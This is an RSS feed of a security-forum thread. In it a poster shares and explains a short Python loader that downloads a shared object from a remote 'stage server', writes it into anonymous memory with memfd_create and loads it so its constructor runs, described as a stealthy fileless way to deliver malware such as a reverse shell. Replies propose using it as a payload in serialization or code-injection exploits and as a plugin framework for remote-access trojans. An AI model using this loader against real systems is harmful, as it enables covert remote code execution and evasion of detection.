@@ -1,0 +1,298 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Pure python in memory SO loading without shm</title>
+    <link>https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453</link>
+    <description>https://github.com/nullbites/SnakeEater
+
+A few months ago I wrote up a silly project to implement purely in memory SO (shared object) loading via the memfd_create syscall. I forgot to include y&#39;all in the fun and I am sorry :frowning:.
+
+Sho&#39; nuff&#39; this is possible in just a few lines of python. I wrote it up as a class and it still is less than 20 LoC. The payload is a basic bitch 3dup rev shell.
+
+Let&#39;s go over how it works.
+
+    class SnakeEaterLoader:
+    def __init__(self):
+        # modify 
+        self.url = &quot;http://127.0.0.1:8080/module1.so&quot;
+        # just to force it to int (lazy)
+        self.fd = 0
+    
+    def get_memfd(self):
+        # python one liners are so pretty ain&#39;t they?
+
+        # use ctypes to get our anon page and corosponding fd
+        self.fd = ctypes.CDLL(None).syscall(MEMFD_CREATE_NO,&quot;/tmp/none&quot;,1)
+    
+    def write_so(self):
+        getter = urllib.request
+        # open connection to stage server
+        resp = getter.urlopen(self.url)
+        if resp.status != 200: # verify
+            print(&quot;could not contact callback server&quot;)
+            exit(1)
+        # get remote so
+        # hosting encrypted and decrypting
+        # here would be pretty easy, but W/E
+        data = resp.read()
+        # write the so to our memfd created
+        # page
+        os.write(self.fd,data)
+
+
+    def open_so(self):
+        # here be magic
+        path = &quot;/proc/self/fd/&quot; + str(self.fd)
+        ctypes.CDLL(path) #.dlopen(path,1) &lt;-- doesn&#39;t fuckin work
+
+I&#39;m pretty sure if I wrote the algorithm out it would actually be valid python so lets just look at the class that provides the implementation
+
+&#39;\_\_int__&#39; sets up the variables for the callback URL and the class field &#39;fd&#39;. FD here is the file descriptor that will correspond to the memory region where out SO is loaded. But chill for a second. We are getting ahead of ourselves. 
+
+Why do we need these file descriptors and shit like that? Can&#39;t we just read the SO into memory and use the shellcode function pointer trick to run it?
+
+Nope. 
+
+Turns out a SO file has headers and shit that make it not behave like shellcode (imagine that). I&#39;m sure you could parse the ELF header and find the entry point, then start execution at the parsed entrypoint; but that sounds like a fucking drag. If we can get the in-memory SO loading working it will make it easier to produce payloads as we don&#39;t have to deal with shellcode conversion and weird NX and DEP rules. 
+
+That and there is no un-explained huge memory map just sitting somewhere. With this technique the SO file actually loads into the process in a very normal looking way. 
+
+So, enough yammering. Time for how it do.
+
+Python is elegant in such that it gives you access to very low level interfaces in a way that is both elegant and easy to understand. 
+
+
+    self.fd = ctypes.CDLL(None).syscall(MEMFD_CREATE_NO,&quot;/tmp/none&quot;,1)
+Let&#39;s explain this
+
+Ctypes is a default python library that provides an interface to interact with DLLs in windows and with SOs in Linux/UNIX systems. Were not using it to load out SO (yet) but we are using it to call memfd_create. This provides us with a file descriptor that corresponds to a chunk of our own processes memory. 
+
+Now we just use urllib and os.write to write out our SO to memory 
+
+urllib gets the data:
+
+    resp = getter.urlopen(self.url)
+    if resp.status != 200: # verify
+        print(&quot;could not contact callback server&quot;)
+        exit(1)
+    # get remote so
+    # hosting encrypted and decrypting
+    # here would be pretty easy, but W/E
+    data = resp.read()  # plain data
+
+and os.write() writes that raw data to memory
+
+    os.write(self.fd,data)
+
+
+Now that we have a SO loaded into memory and a valid file descriptor corosponding to it, it&#39;s just a matter of what we want to do with it. 
+
+We could ptrace it into another process or we can just load it into ours. Doing so is as simple as this:
+
+    def open_so(self):
+        # here be magic
+        path = &quot;/proc/self/fd/&quot; + str(self.fd)
+        ctypes.CDLL(path)
+
+We just access the file decriptor from our own procfs entry and load it with &#39;ctypes.CDLL(path)&#39;
+
+In our SO file we have our malware&#39;s startup function act as the default constructor. So even though we haven&#39;t called any functions in the SO file it has still executed code to &quot;set up it&#39;s own internal data structures&quot; and whatnot. 
+
+That is demonstrated below and it fairly intuitive. 
+
+    void __attribute__ ((constructor)) init_eater(void);
+
+    void init_eater()
+    {
+        .... malware and shit
+    }</description>
+    
+    <lastBuildDate>Sat, 09 Jun 2018 16:19:55 +0000</lastBuildDate>
+    <category>Programming</category>
+    <atom:link href="https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Pure python in memory SO loading without shm</title>
+        <dc:creator><![CDATA[oaktree]]></dc:creator>
+        <description><![CDATA[
+            <p>You have your plugin class extend an abstract class, and then create a factory function to instantiate the plugin.</p>
+          <p><a href="https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453/7</link>
+        <pubDate>Sat, 09 Jun 2018 16:19:55 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-6453-7</guid>
+        <source url="https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453.rss">Pure python in memory SO loading without shm</source>
+      </item>
+      <item>
+        <title>Pure python in memory SO loading without shm</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
+          <p><a href="https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453/6</link>
+        <pubDate>Sat, 26 May 2018 19:31:28 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-6453-6</guid>
+        <source url="https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453.rss">Pure python in memory SO loading without shm</source>
+      </item>
+      <item>
+        <title>Pure python in memory SO loading without shm</title>
+        <dc:creator><![CDATA[nullbites]]></dc:creator>
+        <description><![CDATA[
+            <p>I was thinking that a pickle (or otherwise serialized) version of this technique could be used as a extremely stealthy payload for an serialization exploit. Either that or if there is python command/code injection this could be one-liner’d over to take advantage of currently loaded imports to get stealthy execution on a vulnerable server.</p>
+          <p><a href="https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453/5</link>
+        <pubDate>Fri, 04 May 2018 14:51:01 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-6453-5</guid>
+        <source url="https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453.rss">Pure python in memory SO loading without shm</source>
+      </item>
+      <item>
+        <title>Pure python in memory SO loading without shm</title>
+        <dc:creator><![CDATA[nullbites]]></dc:creator>
+        <description><![CDATA[
+            <p>Hell yeah dude. We need to get together and write up a “plugin-system” for warez and RATs. Seems like a fun way to play with c++ execution/memory management.</p>
+<p>I wonder if there is any way to agnosticly load a class that is formatted to be a plugin. That way the plugin author only has to implement a RunPlugin() method in their class and it can do it’s own field (state for example) and thread management (like what a socks proxy would need).</p>
+          <p><a href="https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453/4</link>
+        <pubDate>Fri, 04 May 2018 14:47:17 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-6453-4</guid>
+        <source url="https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453.rss">Pure python in memory SO loading without shm</source>
+      </item>
+      <item>
+        <title>Pure python in memory SO loading without shm</title>
+        <dc:creator><![CDATA[0x00pf]]></dc:creator>
+        <description><![CDATA[
+            <p>It looks more like this: <a href="https://0x00sec.org/t/super-stealthy-droppers/3715">Super Stealthy Droppers</a>, but loading a library, instead of running a binary <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue_winking_eye.png?v=9" title=":stuck_out_tongue_winking_eye:" class="emoji" alt=":stuck_out_tongue_winking_eye:"></p>
+          <p><a href="https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453/3</link>
+        <pubDate>Fri, 27 Apr 2018 19:31:57 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-6453-3</guid>
+        <source url="https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453.rss">Pure python in memory SO loading without shm</source>
+      </item>
+      <item>
+        <title>Pure python in memory SO loading without shm</title>
+        <dc:creator><![CDATA[oaktree]]></dc:creator>
+        <description><![CDATA[
+            <p>Hmm, is this like what I showed in my article <a href="https://0x00sec.org/t/c-dynamic-loading-of-shared-objects-at-runtime/1498" class="inline-onebox">[C++] Dynamic Loading of Shared Objects at Runtime</a> ?</p>
+          <p><a href="https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453/2</link>
+        <pubDate>Fri, 27 Apr 2018 17:48:08 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-6453-2</guid>
+        <source url="https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453.rss">Pure python in memory SO loading without shm</source>
+      </item>
+      <item>
+        <title>Pure python in memory SO loading without shm</title>
+        <dc:creator><![CDATA[nullbites]]></dc:creator>
+        <description><![CDATA[
+            <aside class="onebox allowlistedgeneric">
+  <header class="source">
+      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
+      <a href="https://github.com/nullbites/SnakeEater" target="_blank" rel="noopener nofollow ugc">GitHub</a>
+  </header>
+  <article class="onebox-body">
+    <img src="https://0x00sec.s3.amazonaws.com/original/2X/0/05b52ea00c632495ab480a7c0cfd2eeecc243ecc.png" class="thumbnail onebox-avatar" width="202" height="202">
+
+<h3><a href="https://github.com/nullbites/SnakeEater" target="_blank" rel="noopener nofollow ugc">nullbites/SnakeEater</a></h3>
+
+<p>Python implementation of the reflective SO injection technique - nullbites/SnakeEater</p>
+
+
+  </article>
+  <div class="onebox-metadata">
+    
+    
+  </div>
+  <div style="clear: both"></div>
+</aside>
+
+<p>A few months ago I wrote up a silly project to implement purely in memory SO (shared object) loading via the memfd_create syscall. I forgot to include y’all in the fun and I am sorry <img src="https://0x00sec.org/images/emoji/twitter/frowning.png?v=9" title=":frowning:" class="emoji" alt=":frowning:">.</p>
+<p>Sho’ nuff’ this is possible in just a few lines of python. I wrote it up as a class and it still is less than 20 LoC. The payload is a basic bitch 3dup rev shell.</p>
+<p>Let’s go over how it works.</p>
+<pre><code>class SnakeEaterLoader:
+def __init__(self):
+    # modify 
+    self.url = "http://127.0.0.1:8080/module1.so"
+    # just to force it to int (lazy)
+    self.fd = 0
+
+def get_memfd(self):
+    # python one liners are so pretty ain't they?
+
+    # use ctypes to get our anon page and corosponding fd
+    self.fd = ctypes.CDLL(None).syscall(MEMFD_CREATE_NO,"/tmp/none",1)
+
+def write_so(self):
+    getter = urllib.request
+    # open connection to stage server
+    resp = getter.urlopen(self.url)
+    if resp.status != 200: # verify
+        print("could not contact callback server")
+        exit(1)
+    # get remote so
+    # hosting encrypted and decrypting
+    # here would be pretty easy, but W/E
+    data = resp.read()
+    # write the so to our memfd created
+    # page
+    os.write(self.fd,data)
+
+
+def open_so(self):
+    # here be magic
+    path = "/proc/self/fd/" + str(self.fd)
+    ctypes.CDLL(path) #.dlopen(path,1) &lt;-- doesn't fuckin work
+</code></pre>
+<p>I’m pretty sure if I wrote the algorithm out it would actually be valid python so lets just look at the class that provides the implementation</p>
+<p>‘__int__’ sets up the variables for the callback URL and the class field ‘fd’. FD here is the file descriptor that will correspond to the memory region where out SO is loaded. But chill for a second. We are getting ahead of ourselves.</p>
+<p>Why do we need these file descriptors and shit like that? Can’t we just read the SO into memory and use the shellcode function pointer trick to run it?</p>
+<p>Nope.</p>
+<p>Turns out a SO file has headers and shit that make it not behave like shellcode (imagine that). I’m sure you could parse the ELF header and find the entry point, then start execution at the parsed entrypoint; but that sounds like a fucking drag. If we can get the in-memory SO loading working it will make it easier to produce payloads as we don’t have to deal with shellcode conversion and weird NX and DEP rules.</p>
+<p>That and there is no un-explained huge memory map just sitting somewhere. With this technique the SO file actually loads into the process in a very normal looking way.</p>
+<p>So, enough yammering. Time for how it do.</p>
+<p>Python is elegant in such that it gives you access to very low level interfaces in a way that is both elegant and easy to understand.</p>
+<pre><code>self.fd = ctypes.CDLL(None).syscall(MEMFD_CREATE_NO,"/tmp/none",1)
+</code></pre>
+<p>Let’s explain this</p>
+<p>Ctypes is a default python library that provides an interface to interact with DLLs in windows and with SOs in Linux/UNIX systems. Were not using it to load out SO (yet) but we are using it to call memfd_create. This provides us with a file descriptor that corresponds to a chunk of our own processes memory.</p>
+<p>Now we just use urllib and os.write to write out our SO to memory</p>
+<p>urllib gets the data:</p>
+<pre><code>resp = getter.urlopen(self.url)
+if resp.status != 200: # verify
+    print("could not contact callback server")
+    exit(1)
+# get remote so
+# hosting encrypted and decrypting
+# here would be pretty easy, but W/E
+data = resp.read()  # plain data
+</code></pre>
+<p>and os.write() writes that raw data to memory</p>
+<pre><code>os.write(self.fd,data)
+</code></pre>
+<p>Now that we have a SO loaded into memory and a valid file descriptor corosponding to it, it’s just a matter of what we want to do with it.</p>
+<p>We could ptrace it into another process or we can just load it into ours. Doing so is as simple as this:</p>
+<pre><code>def open_so(self):
+    # here be magic
+    path = "/proc/self/fd/" + str(self.fd)
+    ctypes.CDLL(path)
+</code></pre>
+<p>We just access the file decriptor from our own procfs entry and load it with ‘ctypes.CDLL(path)’</p>
+<p>In our SO file we have our malware’s startup function act as the default constructor. So even though we haven’t called any functions in the SO file it has still executed code to “set up it’s own internal data structures” and whatnot.</p>
+<p>That is demonstrated below and it fairly intuitive.</p>
+<pre><code>void __attribute__ ((constructor)) init_eater(void);
+
+void init_eater()
+{
+    .... malware and shit
+}</code></pre>
+          <p><a href="https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453/1</link>
+        <pubDate>Thu, 26 Apr 2018 19:27:19 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-6453-1</guid>
+        <source url="https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453.rss">Pure python in memory SO loading without shm</source>
+      </item>
+  </channel>
+</rss>
